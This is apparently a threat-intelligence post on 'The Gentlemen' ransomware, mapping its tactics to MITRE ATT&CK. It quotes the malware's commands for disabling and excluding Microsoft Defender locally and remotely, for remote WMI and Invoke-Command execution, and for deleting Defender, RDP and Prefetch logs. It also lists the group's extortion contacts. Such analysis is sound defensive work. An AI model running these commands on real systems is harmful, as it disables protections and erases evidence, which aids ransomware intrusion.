---
title: "Threats Intelligence 01: The Gentlemen Ransomware"
date: 2026-02-20 18:00:00 +0200
categories:
  - Threats Intelligences
tags:
  - threat-intelligence
  - ransomware
  - mitre-attack
  - malware-analysis
summary: "The Gentlemen Ransomware is a highly sophisticated, fast-moving ransomware group that emerged in July-August 2025, quickly establishing itself as a major global cyber threat. The group operates under a Ransomware-as-a-Service (RaaS) model, offering affiliates a customizable, cross-platform toolkit targeting different environments."
description: "Detailed breakdown of The Gentlemen ransomware operational commands and references extracted from hapvida.exe."
image:
  path: /assets/img/the-gentlemen-ransomware/gentlemen-cover.webp
  alt: The Gentlemen Ransomware
---

# The Gentlemen Ransomware

The Gentlemen Ransomware is a highly sophisticated, fast-moving ransomware group that emerged in **July–August 2025**, quickly establishing itself as a major global cyber threat. The group operates under a **Ransomware-as-a-Service (RaaS)** model, offering affiliates a customizable, cross-platform toolkit targeting different environments.

---

## Key Tactics and Techniques

![The Ransomware Attack Chain](/assets/img/the-gentlemen-ransomware/ransomware-attack-chain.webp)

*Source: Trend Micro — The Ransomware Attack Chain*

---

## 1. Initial Access

- Exploitation of internet-facing services
- Abuse of compromised **FortiGate** administrative accounts

### C2 & Contact Reference

| Channel | Value |
|---|---|
| **Email** | `negotiation_hapvida@proton.me` |
| **TOX ID** | `ID88984846080D639C9A4EC394E53BA616D550B2B3AD691942EA2CCD33AA5B9340FD1A8FF40E9A` |
| **TOX Download** | `https://tox.chat/download.html` |
| **Leak Site (Tor)** | `http://.onion/` |
| **Tor Browser** | `https://www.torproject.org/download/` |

---

## 2. Reconnaissance & Discovery

Network scanning performed using **Advanced IP Scanner** and **Nmap**. Enumerates all local drives and Windows Failover Cluster Shared Volumes (CSV) for encryption targeting.

### Enable Network Discovery

```powershell
Get-NetFirewallRule -DisplayGroup "Network Discovery" | Enable-NetFirewallRule
```

### Volume Enumeration

```powershell
$volumes = @()
$volumes += Get-WmiObject -Class Win32_Volume | Where-Object { $_.Name -like '*:\*' } | Select-Object -ExpandProperty Name
try {
    $volumes += Get-ClusterSharedVolume | ForEach-Object { $_.SharedVolumeInfo.FriendlyVolumeName }
} catch {}
$volumes
```

### System Information Banner

```powershell
Write-Host "Windows version <version>" -BackgroundColor Blue -ForegroundColor White
Write-Host "The Gentlemen" -BackgroundColor DarkGray -ForegroundColor White -NoNewline
```

---

## 3. Privilege Escalation

Execution of components with elevated privileges to gain full environment control.

### Elevated Execution Flags

| Flag | Description |
|---|---|
| `/RU SYSTEM` | `schtasks` flag — run task as SYSTEM account |
| `--system` | Ransomware flag — encrypt as SYSTEM user |
| `Win32_Process` | WMI class used for elevated process creation |

### WMI Elevated Process Creation

```powershell
$p = [WMICLASS]"\\%s\root\cimv2:Win32_Process"
$p.Create("%s")
```

---

## 4. Defense Evasion

- Deployment of **kernel-level anti-AV** utilities
- Configuration of AV/Defender exclusion paths
- Neutralization of **EDR** tools
- Disabling **Microsoft Defender** real-time protection

### Local — Disable & Exclude

```powershell
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true;
Add-MpPreference -ExclusionPath 'C:\';
Add-MpPreference -ExclusionPath 'C:\Temp';
Add-MpPreference -ExclusionPath '\<share$>';"
```

### Forced Override

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Force
```

### Remote — Cross-System Execution

```powershell
Invoke-Command -ComputerName %s -ScriptBlock {
    Set-MpPreference -DisableRealtimeMonitoring $true;
    Add-MpPreference -ExclusionPath 'C:\';
    Add-MpPreference -ExclusionProcess '%s'
}
```

### Log & Artifact Clearing

| Target | Command |
|---|---|
| **Defender Support Logs** | `del /f /q C:\ProgramData\Microsoft\Windows Defender\Support\*.*` |
| **RDP Log Files** | `del /f /q %SystemRoot%\System32\LogFiles\RDP*\*.*` |
| **Windows Prefetch** | `del /f /q C:\Windows\Prefetch\*.*` |

---

## 5. Lateral Movement & Remote Execution

Use of legitimate admin tools (**PsExec**, **PowerRun**, **PuTTY**) to transfer and execute payloads across systems.

### Remote Process Execution via WMI

```powershell
$p = [WMICLASS]"\\%s\root\cimv2:Win32_Process"
$p.Create("%s")
```

### Remote Process Execution via Invoke-Command

```powershell
Invoke-Command -ComputerName %s -ScriptBlock { Start-Process "%s" }
```

---

## 6. Persistence & Propagation

GPO manipulation for domain-wide payload distribution.

```powershell
Invoke-Command -ComputerName %s -ScriptBlock {
    Set-MpPreference -DisableRealtimeMonitoring $true;
    Add-MpPreference -ExclusionPath 'C:\';
    Add-MpPreference -ExclusionProcess '%s'
}
```

### NETLOGON / SYSVOL Share Abuse

| Reference | Description |
|---|---|
| `\share$` | UNC share path used for payload staging |
| `--shares` | Ransomware flag: encrypt UNC/network shares |
| `NETLOGON` | Referenced in LanmanServer context — domain-wide deployment |
| `autorun.ini` / `autorun.inf` | AnyDesk persistent encrypted remote access |

---

## 7. Data Collection & Exfiltration

- Staging of sensitive data prior to exfiltration
- Encrypted **SFTP** exfiltration using **WinSCP**

### Volume Enumeration

```powershell
$volumes += Get-WmiObject -Class Win32_Volume | Where-Object { $_.Name -like '*:\*' } | Select-Object -ExpandProperty Name
$volumes += Get-ClusterSharedVolume | ForEach-Object { $_.SharedVolumeInfo.FriendlyVolumeName }
```

---

## 8. Ransomware Deployment & Impact

- Ransomware deployed via **NETLOGON** share using domain admin credentials
- File encryption with **`.7mzhh`** extension
- Ransom note dropped as **`README-GENTLEMEN.txt`**
- Termination of backup, database, and security services: **Veeam**, **SQL**, **Oracle**, **SAP**, **Acronis**
- Deletion of shadow copies, logs, artifacts, and security event data

---

## 9. Victimology

![Victim Distribution by Industry, Region, and Country](/assets/img/the-gentlemen-ransomware/victim-distribution.webp)

*Source: Trend Micro — Victim distribution by industry, region, and country*

### Target Industries

`Manufacturing` · `Construction` · `Healthcare` · `Insurance` · `Others`

### Target Regions

`Asia-Pacific` · `South America` · `North America` · `Middle East` · `Others`

---

## 10. Technical Analysis

### Execution Arguments

When launched, the ransomware executable provides an extensive help message, showing various options and flags available.

---

## MITRE ATT&CK Mapping

| Technique ID | Tactic | Name |
|---|---|---|
| T1190 | Initial Access | Exploit Public-Facing Application |
| T1078 | Initial Access | Valid Accounts |
| T1046 | Discovery | Network Service Discovery |
| T1082 | Discovery | System Information Discovery |
| T1053.005 | Privilege Escalation | Scheduled Task/Job |
| T1047 | Execution | Windows Management Instrumentation |
| T1562.001 | Defense Evasion | Disable or Modify Tools |
| T1070.001 | Defense Evasion | Clear Windows Event Logs |
| T1021.006 | Lateral Movement | Remote Services: PowerShell Remoting |
| T1570 | Lateral Movement | Lateral Tool Transfer |
| T1567.002 | Exfiltration | Exfiltration to Cloud Storage |
| T1486 | Impact | Data Encrypted for Impact |
| T1490 | Impact | Inhibit System Recovery |
| T1489 | Impact | Service Stop |